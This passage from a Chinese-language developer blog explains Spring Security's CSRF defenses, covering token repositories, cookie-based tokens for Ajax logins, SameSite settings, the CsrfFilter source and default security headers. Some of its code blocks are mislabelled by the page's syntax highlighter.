class="hljs-string">&quot;/hello&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">th:value</span>=<span class="hljs-string">&quot;$&#123;_csrf.token&#125;&quot;</span></span><br><span class="hljs-tag">                   <span class="hljs-attr">th:name</span>=<span class="hljs-string">&quot;$&#123;_csrf.parameterName&#125;&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中引入了thymeleaf,使用${_csrf.parameterName}来从服务端来获取一个csrf令牌</p><p>&#x3D;&#x3D;并且配置文件中不能设置csrf().disable()的&#x3D;&#x3D;,前面我们都设置为disable记得要开启,security默认是开启状态的</p><p>如果是前后端分离项目,使用的Ajax,可以将令牌存到cookie中</p><p>配置文件:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span><br>                                                                <span class="hljs-keyword">throws</span> Exception &#123;<br>        auth.inMemoryAuthentication()<br>                .withUser(<span class="hljs-string">&quot;javaboy&quot;</span>)<br>                .password(<span class="hljs-string">&quot;&#123;noop&#125;123&quot;</span>)<br>                .roles(<span class="hljs-string">&quot;admin&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        http.authorizeRequests()<br>                .anyRequest().authenticated()<br>                .and()<br>                .formLogin()<br>                .loginProcessingUrl(<span class="hljs-string">&quot;/login.html&quot;</span>)<br>                .successHandler((req,resp,auth)-&gt;&#123;<br>                    resp.getWriter().write(<span class="hljs-string">&quot;login success&quot;</span>);<br>                &#125;)<br>                .permitAll()<br>                .and()<br>                .csrf()<br>                .csrfTokenRepository(CookieCsrfTokenRepository<br>                                                          .withHttpOnlyFalse());<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是，这里将csrfTokenRepository配置为CookieCsrfTokenRepository，并设置httpOnly属性为false，否则前端将无法读取到Cookie中的CSRF令牌。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">script</span></span><br><span class="hljs-tag">          <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">script</span>     <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/</span></span><br><span class="hljs-string"><span class="hljs-tag">  jquery.cookie.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登录&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginBtn&quot;</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">         $(<span class="hljs-string">&quot;#loginBtn&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">             <span class="hljs-keyword">let</span> _csrf = $.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;XSRF-TOKEN&#x27;</span>);</span><br><span class="language-javascript">             $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login.html&#x27;</span>, &#123;</span><br><span class="language-javascript">                 <span class="hljs-attr">username</span>: $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>(),</span><br><span class="language-javascript">                 <span class="hljs-attr">password</span>: $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>(),</span><br><span class="language-javascript">                 <span class="hljs-attr">_csrf</span>: _csrf</span><br><span class="language-javascript">             &#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;</span><br><span class="language-javascript">                 <span class="hljs-title function_">alert</span>(data);</span><br><span class="language-javascript">             &#125;)</span><br><span class="language-javascript">         &#125;)</span><br><span class="language-javascript">     </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>HTML文件修改结果如上</p><h6 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h6><p>有三种属性值:</p><ul><li>Strict:同一站发送的请求才会包含Cookie,不同站发送不会包含Cookie</li><li>Lax:同一站点发送的请求或者导航到目标地址的GET请求会自动包含Cookie信息，否则不包含Cookie信息。</li><li>None:Cookie将在所有上下文中发送，即允许跨域发送</li></ul><blockquote><p>Strict是一种非常严格的模式，可能会带来不好的用户体验。举一个简单例子：假设用户登录了<a href="http://www.javaboy.org网站,并保持了登录状态,现在用户在email.qq.com上收到一封电子邮件,电子邮件中有一个超链接指向www.javaboy.org,当用户单击这个超链接,理所应当地携带cookie并自动进行www.javaboy.org站点的身份认证,然而strict会阻止单击超链接时携带cookie,进而造成用户身份认证失败.而lax则稍微友好一些,允许get请求携带cookie./">www.javaboy.org网站，并保持了登录状态，现在用户在email.qq.com上收到一封电子邮件，电子邮件中有一个超链接指向www.javaboy.org，当用户单击这个超链接，理所应当地携带Cookie并自动进行www.javaboy.org站点的身份认证，然而Strict会阻止单击超链接时携带Cookie，进而造成用户身份认证失败。而Lax则稍微友好一些，允许GET请求携带Cookie。</a><br>使用SameSite还有一个需要考虑的因素就是浏览器的兼容性。虽然大部分现代浏览器都支持SameSite属性，但是可能还是存在一些古董级浏览器不支持该属性。所以，如果使用SameSite来处理CSRF攻击，建议作为一个备选方案，而不是主要方案。</p></blockquote><p>Spring Security对于SameSite并未直接提供支持，但是Spring Session提供了，因此，在使用时，需要首先引入Spring Session和Redis依赖</p><p>提供一个CookieSerializer实例即可，并配置SameSite属性值为strict：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> CookieSerializer <span class="hljs-title function_">httpSessionIdResolver</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">DefaultCookieSerializer</span> <span class="hljs-variable">cookieSerializer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultCookieSerializer</span>();<br>    cookieSerializer.setSameSite(<span class="hljs-string">&quot;strict&quot;</span>);<br>    <span class="hljs-keyword">return</span> cookieSerializer;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="可能会出现的问题"><a href="#可能会出现的问题" class="headerlink" title="可能会出现的问题"></a>可能会出现的问题</h6><p>超时问题:</p><ul><li>如果HttpSession过期会导致csrf令牌无法认证<ul><li>可以给httpSession续命</li><li>通过js来获取csrf来和表单一起提交</li><li>令牌存储在Cookie中而不是HttpSession中</li></ul></li><li>为了保护用户的敏感信息登录和注销最好也采用csrf攻击防护</li><li>文件上传<ul><li>&#x3D;&#x3D;没看明白啊&#x3D;&#x3D;</li></ul></li></ul><p>CsrfToken</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CsrfToken</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Serializable</span> &#123;<br><span class="hljs-comment">//如果在请求体内则获取参数名</span><br>    String <span class="hljs-title function_">getHeaderName</span><span class="hljs-params">()</span>;<br><span class="hljs-comment">//当csrf被当作参数传递令牌获取参数名</span><br>    String <span class="hljs-title function_">getParameterName</span><span class="hljs-params">()</span>;<br><span class="hljs-comment">//获取token</span><br>    String <span class="hljs-title function_">getToken</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>有两个实现类</p><ul><li><p>DefaultCsrfToken:默认的直接创建并实现了三个方法，太帅了这实现😓</p><ul><li>&#96;&#96;&#96;java<br>public final class DefaultCsrfToken implements CsrfToken {<br>private final String token;<br>private final String parameterName;<br>private final String headerName;<br><br>public DefaultCsrfToken(String headerName, String parameterName, String token) {<br>    Assert.hasLength(headerName, “headerName cannot be null or empty”);<br>    Assert.hasLength(parameterName, “parameterName cannot be null or empty”);<br>    Assert.hasLength(token, “token cannot be null or empty”);<br>    this.headerName &#x3D; headerName;<br>    this.parameterName &#x3D; parameterName;<br>    this.token &#x3D; token;<br>}<br><br>public String getHeaderName() {<br>    return this.headerName;<br>}<br><br>public String getParameterName() {<br>    return this.parameterName;<br>}<br><br>public String getToken() {<br>    return this.token;<br>}<br>}<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>- SaveOnAccessCsrfToken:是一个代理类<br><br>  - 只有两个类这个又是代理类...懂得都懂<br><br>  - ```java<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-keyword">class</span> <span class="hljs-title">SaveOnAccessCsrfToken</span> <span class="hljs-title">implements</span> <span class="hljs-title">CsrfToken</span> &#123;<br>        <span class="hljs-keyword">private</span> transient CsrfTokenRepository tokenRepository;<br>        <span class="hljs-keyword">private</span> transient HttpServletRequest request;<br>        <span class="hljs-keyword">private</span> transient HttpServletResponse response;<br>        <span class="hljs-keyword">private</span> final CsrfToken <span class="hljs-built_in">delegate</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getHeaderName</span>()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.<span class="hljs-built_in">delegate</span>.getHeaderName();<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getParameterName</span>()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.<span class="hljs-built_in">delegate</span>.getParameterName();<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getToken</span>()</span> &#123;<br>            <span class="hljs-keyword">this</span>.saveTokenIfNecessary();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.<span class="hljs-built_in">delegate</span>.getToken();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><p>上面的SaveOnAccessCsrfToken是在LazyCsrfTokenRepository中实现的而他实现的是CsrfTokenRepository接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CsrfTokenRepository</span> &#123;<br>    CsrfToken <span class="hljs-title function_">generateToken</span><span class="hljs-params">(HttpServletRequest var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveToken</span><span class="hljs-params">(CsrfToken var1, HttpServletRequest var2, HttpServletResponse var3)</span>;<br><br>    CsrfToken <span class="hljs-title function_">loadToken</span><span class="hljs-params">(HttpServletRequest var1)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到有三个方法都是操纵令牌的:</p><ul><li>generateTokensh:生成一个令牌</li><li>saveToken:存储一个令牌</li><li>loadToken:读取一个令牌</li></ul><p>它共有三个实现类:</p><ul><li><p>LazyCsrfTokenRepository:</p><ul><li><blockquote><p>（1）generateToken：在生成CsrfToken时，代理类生成的CsrfToken类型是DefaultCsrfToken，这里将DefaultCsrfToken装饰为SaveOnAccessCsrfToken，当调用SaveOnAccessCsrfToken中的getToken方法时，才会去保存CsrfToken。<br>（2）saveToken：只有当token为null时，才会去执行代理类的saveToken方法（相当于只执行移除CsrfToken操作）。</p></blockquote></li><li><p>用来代理下面的两个类</p></li></ul></li><li><p>HttpSessionCsrfTokenRepository:将令牌存到HttpSession中.</p><ul><li><p>主要看三个实现方法都很简单</p></li><li><pre><code class="java">public void saveToken(CsrfToken token, HttpServletRequest request, HttpServletResponse response) &#123;    HttpSession session;    if (token == null) &#123;        session = request.getSession(false);        if (session != null) &#123;            session.removeAttribute(this.sessionAttributeName);        &#125;    &#125; else &#123;        session = request.getSession();        session.setAttribute(this.sessionAttributeName, token);    &#125;&#125;public CsrfToken loadToken(HttpServletRequest request) &#123;    HttpSession session = request.getSession(false);    return session == null ? null : (CsrfToken)session.getAttribute(this.sessionAttributeName);&#125;public CsrfToken generateToken(HttpServletRequest request) &#123;    return new DefaultCsrfToken(this.headerName, this.parameterName, this.createNewToken());&#125;<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>  - saveToken是判断是否存在session和是否传入token如果不存在token并且session存在则从HttpSession中将token删除,如果token不为空则将token放入HttpSession中<br><br>  - loadToken,查看HttpSession是否存在,存在则取出CsrfToken<br><br>  - generateToken:创建一个DefaultCsrfToken,headerName和parameterName都是默认的,而具体的令牌则是一个UUID字符串。<br><br>- CookieCsrfTokenRepository:将csrf放到Cookie中<br><br>  - ```java<br>    public CsrfToken generate<span class="hljs-constructor">Token(HttpServletRequest <span class="hljs-params">request</span>)</span> &#123;<br>        return <span class="hljs-keyword">new</span> <span class="hljs-constructor">DefaultCsrfToken(<span class="hljs-params">this</span>.<span class="hljs-params">headerName</span>, <span class="hljs-params">this</span>.<span class="hljs-params">parameterName</span>, <span class="hljs-params">this</span>.<span class="hljs-params">createNewToken</span>()</span>);<br>    &#125;<br>    <br>    public void save<span class="hljs-constructor">Token(CsrfToken <span class="hljs-params">token</span>, HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>)</span> &#123;<br>        String tokenValue = token != null ? token.get<span class="hljs-constructor">Token()</span> : <span class="hljs-string">&quot;&quot;</span>;<br>        Cookie cookie = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Cookie(<span class="hljs-params">this</span>.<span class="hljs-params">cookieName</span>, <span class="hljs-params">tokenValue</span>)</span>;<br>        cookie.set<span class="hljs-constructor">Secure(<span class="hljs-params">this</span>.<span class="hljs-params">secure</span> != <span class="hljs-params">null</span> ? <span class="hljs-params">this</span>.<span class="hljs-params">secure</span> : <span class="hljs-params">request</span>.<span class="hljs-params">isSecure</span>()</span>);<br>        cookie.set<span class="hljs-constructor">Path(StringUtils.<span class="hljs-params">hasLength</span>(<span class="hljs-params">this</span>.<span class="hljs-params">cookiePath</span>)</span> ? this.cookiePath : this.get<span class="hljs-constructor">RequestContext(<span class="hljs-params">request</span>)</span>);<br>        cookie.set<span class="hljs-constructor">MaxAge(<span class="hljs-params">token</span> != <span class="hljs-params">null</span> ? <span class="hljs-params">this</span>.<span class="hljs-params">cookieMaxAge</span> : 0)</span>;<br>        cookie.set<span class="hljs-constructor">HttpOnly(<span class="hljs-params">this</span>.<span class="hljs-params">cookieHttpOnly</span>)</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">StringUtils</span>.</span></span>has<span class="hljs-constructor">Length(<span class="hljs-params">this</span>.<span class="hljs-params">cookieDomain</span>)</span>) &#123;<br>            cookie.set<span class="hljs-constructor">Domain(<span class="hljs-params">this</span>.<span class="hljs-params">cookieDomain</span>)</span>;<br>        &#125;<br>    <br>        response.add<span class="hljs-constructor">Cookie(<span class="hljs-params">cookie</span>)</span>;<br>    &#125;<br>    <br>    public CsrfToken load<span class="hljs-constructor">Token(HttpServletRequest <span class="hljs-params">request</span>)</span> &#123;<br>        Cookie cookie = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WebUtils</span>.</span></span>get<span class="hljs-constructor">Cookie(<span class="hljs-params">request</span>, <span class="hljs-params">this</span>.<span class="hljs-params">cookieName</span>)</span>;<br>        <span class="hljs-keyword">if</span> (cookie<span class="hljs-operator"> == </span>null) &#123;<br>            return null;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            String token = cookie.get<span class="hljs-constructor">Value()</span>;<br>            return !<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">StringUtils</span>.</span></span>has<span class="hljs-constructor">Length(<span class="hljs-params">token</span>)</span> ? null : <span class="hljs-keyword">new</span> <span class="hljs-constructor">DefaultCsrfToken(<span class="hljs-params">this</span>.<span class="hljs-params">headerName</span>, <span class="hljs-params">this</span>.<span class="hljs-params">parameterName</span>, <span class="hljs-params">token</span>)</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>generateToken和HttpSessionCsrfTokenRepository一样</p></li><li><p>saveToken新建一个Cookie并将token添加到里面</p></li><li><p>创建CookieCsrfTokenRepository有两种</p><ul><li>调用静态方法withHttpOnlyFalse,这样httpOnly会被设置为false,js可以获取cookie</li><li>调用构造方法来创建这样HttpOnly会被设置为true,js可以获取cookie</li></ul></li></ul></li></ul><p>CsrfFilter</p><p>它继承OncePerRequestFilter,而OncePerRequestFilter又继承GenericFilterBean</p><p>所以他是SpringSecurity中重要的一环</p><p>csrfFilter的核心代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilterInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    request.setAttribute(HttpServletResponse.class.getName(), response);<br>    <span class="hljs-type">CsrfToken</span> <span class="hljs-variable">csrfToken</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.tokenRepository.loadToken(request);<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">missingToken</span> <span class="hljs-operator">=</span> csrfToken == <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (missingToken) &#123;<br>        csrfToken = <span class="hljs-built_in">this</span>.tokenRepository.generateToken(request);<br>        <span class="hljs-built_in">this</span>.tokenRepository.saveToken(csrfToken, request, response);<br>    &#125;<br><br>    request.setAttribute(CsrfToken.class.getName(), csrfToken);<br>    request.setAttribute(csrfToken.getParameterName(), csrfToken);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.requireCsrfProtectionMatcher.matches(request)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logger.isTraceEnabled()) &#123;<br>            <span class="hljs-built_in">this</span>.logger.trace(<span class="hljs-string">&quot;Did not protect against CSRF since request did not match &quot;</span> + <span class="hljs-built_in">this</span>.requireCsrfProtectionMatcher);<br>        &#125;<br><br>        filterChain.doFilter(request, response);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">actualToken</span> <span class="hljs-operator">=</span> request.getHeader(csrfToken.getHeaderName());<br>        <span class="hljs-keyword">if</span> (actualToken == <span class="hljs-literal">null</span>) &#123;<br>            actualToken = request.getParameter(csrfToken.getParameterName());<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!equalsConstantTime(csrfToken.getToken(), actualToken)) &#123;<br>            <span class="hljs-built_in">this</span>.logger.debug(LogMessage.of(() -&gt; &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid CSRF token found for &quot;</span> + UrlUtils.buildFullRequestUrl(request);<br>            &#125;));<br>            <span class="hljs-type">AccessDeniedException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> !missingToken ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidCsrfTokenException</span>(csrfToken, actualToken) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">MissingCsrfTokenException</span>(actualToken);<br>            <span class="hljs-built_in">this</span>.accessDeniedHandler.handle(request, response, (AccessDeniedException)exception);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            filterChain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>加载流程</p><blockquote><p>（1）首先调用tokenRepository.loadToken方法去加载出CsrfToken对象，默认使用的tokenRepository对象类型是LazyCsrfTokenRepository。<br>（2）如果CsrfToken对象不存在，则立马生成CsrfToken对象并保存起来。需要注意，如果tokenRepository类型是LazyCsrfTokenRepository，则这里并未真正将CsrfToken令牌保存起来。<br>（3）将生成的CsrfToken对象设置到request属性中，这样我们在前端页面中就可以渲染出生成的令牌信息了。<br>（4）调用requireCsrfProtectionMatcher.matches方法进行请求判断，该方法主要是判断当前请求方法是否是GET、HEAD、TRACE以及OPTIONS。我们前面讲过，如果当前请求方法是这四种之一，则请求直接过，不用进行接下来的CSRF令牌校验，这也意味着上一步没有必要进行CsrfToken保存操作。此时使用LazyCsrfTokenRepository的优势就体现出来了，在第2步中生成了CsrfToken令牌，但是没有立即保存，而是到后面调用时才保存。<br>（5）如果请求方法不是GET、HEAD、TRACE以及OPTIONS，则先从请求头中提取出CSRF令牌；请求头没有，则从请求参数中提取出CSRF令牌，将拿到的CSRF令牌和第1步中通过loadToken加载出来的令牌进行比对，判断请求传来的CSRF令牌是否合法。</p></blockquote><h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><p>springsecurity默认的请求头包含：(前三个是缓存有关)</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Cache-Control:</span> <span class="hljs-literal">no</span><span class="hljs-string">-cache,</span> <span class="hljs-literal">no</span><span class="hljs-string">-store,</span> <span class="hljs-string">max-age=0,</span> <span class="hljs-string">must-revalidate</span><br><span class="hljs-attr">Pragma:</span> <span class="hljs-literal">no</span><span class="hljs-string">-cache</span><br><span class="hljs-attr">Expires:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">X-Content-Type-Options:</span> <span class="hljs-string">nosniff</span><br><span class="hljs-attr">Strict-Transport-Security:</span> <span class="hljs-string">max-age=31536000</span> <span class="hljs-string">;</span> <span class="hljs-string">includeSubDomains</span><br><span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">DENY</span><br><span class="hljs-attr">X-XSS-Protection:</span> <span class="hljs-number">1</span><span class="hljs-string">;</span> <span class="hljs-string">mode=b</span><br></code></pre></td></tr></table></figure><p>请求头都是在HeaderWriterFilter中添加的,而它自身又是通过HeadersConfigurer来配置的</p><p>重点来看configure方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 